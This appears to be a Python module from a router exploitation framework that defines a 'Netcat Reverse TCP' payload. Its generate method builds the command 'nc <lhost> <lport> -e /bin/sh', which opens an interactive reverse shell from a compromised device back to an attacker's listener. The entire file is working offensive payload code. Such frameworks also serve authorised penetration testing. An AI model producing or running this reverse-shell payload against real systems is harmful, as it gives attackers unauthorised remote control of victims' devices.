from routerxpl.core.exploit import *
from routerxpl.core.exploit.payloads import GenericPayload, ReverseTCPPayloadMixin


class Payload(ReverseTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "Netcat Reverse TCP",
        "description": "Creates interactive tcp reverse shell by using netcat.",
        "authors": (
            "Marcin Bury",
            "André Henrique (@mrhenrike)",
        ),
    }

    cmd = OptString("nc", "Netcat binary")
    shell_binary = OptString("/bin/sh", "Shell")

    def generate(self):
        return "{} {} {} -e {}".format(self.cmd,
                                       self.lhost,
                                       self.lport,
                                       self.shell_binary)
